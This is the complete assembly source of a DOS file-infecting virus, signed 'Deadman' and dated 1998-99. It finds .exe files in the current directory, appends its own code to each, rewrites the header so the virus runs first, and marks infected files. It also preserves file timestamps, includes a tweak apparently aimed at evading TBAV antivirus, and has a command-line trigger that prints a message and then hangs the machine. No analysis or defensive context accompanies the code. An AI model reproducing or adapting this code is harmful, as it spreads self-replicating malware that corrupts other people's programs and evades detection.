                           jumps
                           model   tiny
                           codeseg
    start:
                           push    bx cx dx si di bp es ds

                           push    cs
                           pop     es
                           mov     ax,1200h
                           int     2fh
                           cmp     al,0ffh
                           sbb     ch,ch
                           mov     cl,1
                           lea     di,stosed
                           mov     al,90h
                           rep     stosb
    stosed:                nop

                           mov     ax,4408h
                           xor     bx,bx
                           int     21h
                           or      ax,ax
                           jz      exit

                           mov     si,81h
    cmd:
                           lodsb
                           cmp     al,' '
                           jne     ign
                           cmp     byte ptr [si],'*'
                           jne     ign

                           lea     si,scre
    hi:                    lods    byte ptr cs:[si]
                           cmp     al,0
                           jz      eol
                           mov     dl,al
                           mov     ah,2
                           int     21h

                           mov     cx,225
    delay:                 push    cx
                           mov     cx,-1
                           loop    $
                           pop     cx
                           loop    delay
                           jmp     hi
    eol:                   jmp     $



    ign:                   cmp     al,0dh
                           jne     cmd

                           mov     ah,2fh
                           int     21h
                           push    es bx

                           push    cs cs
                           pop     ds es

                           mov     ah,1ah
                           lea     dx,dta
                           int     21h

                           mov     ah,4eh
                           mov     cx,0e7h
                           lea     dx,exe

    fnext:                 int     21h
                           jc      no_more
                           lea     dx,dta+1eh
                           call    infect_exe
                           mov     ah,4fh
                           jmp     fnext

    no_more:               mov     ah,1ah
                           pop     dx ds
                           int     21h
    exit:
                           pop     ds es
                           mov     ax,ds
                           add     ax,10h
                           add     word ptr cs:_cs,ax
                           add     word ptr cs:_ss,ax

                           pop     bp di si dx cx bx

                           db      0b8h
    _ss                    dw      0
                           mov     ss,ax
                           db      0bch
    _sp                    dw      0

                           db      0eah
    _ip                    dw      000h
    _cs                    dw      -10h

    infect_exe             proc    near
                           push    word ptr _ss
                           push    word ptr _sp
                           push    word ptr _ip
                           push    word ptr _cs

                           mov     ax,4301h
                           xor     cx,cx
                           int     21h
                           mov     ax,3d02h
                           int     21h
                           jc      atr

                           xchg    ax,bx
                           mov     ah,3fh
                           mov     cx,28
                           lea     dx,buffer
                           int     21h
                           cmp     ax,cx
                           jnz     close
                           cmp     word ptr buffer,'ZM'
                           jne     close
                           cmp     word ptr buffer+12h,'aF'
                           je      close
                           cmp     byte ptr buffer+18h,40h
                           je      close

                           mov     ax,512
                           mov     cx,word ptr buffer+4
                           cmp     word ptr buffer+2,0
                           jz      $+3
                           dec     cx
                           mul     cx
                           add     ax,word ptr buffer+2
                           adc     dx,0
                           xchg    ax,si
                           xchg    dx,di

                           mov     dx,word ptr dta+1ah+2
                           mov     ax,word ptr dta+1ah
                           cmp     dx,6
                           ja      close

                           cmp     ax,si                   ; compare its
                           jne     close
                           cmp     dx,di
                           jne     close

                           mov     si,word ptr buffer+14h
                           mov     word ptr _ip,si
                           mov     si,word ptr buffer+16h
                           mov     word ptr _cs,si
                           mov     si,word ptr buffer+0eh
                           mov     word ptr _ss,si
                           mov     si,word ptr buffer+10h
                           mov     word ptr _sp,si


                           push    ax dx                   ; get location in exe file
                           mov     cx,16
                           div     cx
                           sub     ax,word ptr buffer+8
                           mov     bp,16
                           sub     bp,dx
                           inc     ax
                           cwd
                           mov     word ptr buffer+14h,dx
                           mov     word ptr buffer+16h,ax
                           inc     ax                      ; special for TBAV
                           mov     word ptr buffer+0eh,ax
                           mov     word ptr buffer+10h,1000h
                           pop     dx ax

                           add     ax,vsize
                           adc     dx,0
                           add     ax,bp
                           adc     dx,0
                           mov     cx,512
                           div     cx
                           or      dx,dx
                           jz      $+3
                           inc     ax
                           mov     word ptr buffer+2,dx
                           mov     word ptr buffer+4,ax

                           mov     word ptr buffer+12h,'aF'

                           mov     ax,5700h
                           int     21h
                           push    cx dx

                           mov     ax,4202h
                           xor     cx,cx
                           cwd
                           int     21h

                           mov     ah,40h
                           mov     cx,bp
                           int     21h
                           mov     ah,40h
                           mov     cx,vsize
                           cwd
                           int     21h
                           xor     cx,ax
                           jnz     res_dda
                           mov     ax,4200h
                           cwd
                           int     21h
                           mov     ah,40h
                           mov     cl,28
                           lea     dx,buffer
                           int     21h
    res_dda:
                           pop     dx cx
                           mov     ax,5701h
                           int     21h

    close:                 mov     ah,3eh
                           int     21h

    atr:                   mov     ax,4301h
                           xor     cx,cx
                           mov     cl,byte ptr dta+15h
                           lea     dx,dta+1eh
                           int     21h

                           pop     word ptr _cs
                           pop     word ptr _ip
                           pop     word ptr _sp
                           pop     word ptr _ss
                           ret

    infect_exe             endp

    exe                    db      '*.exe',0
                           db      '[FALSE]',0
                           db      'Copyright (C)  1998-99 by Deadman',0

    scre                   db      'It seems to be all right',0dh,0ah,0

    vsize                  equ     $-start

    dta                    db      43 dup (?)
    buffer                 label   byte
                           end     start
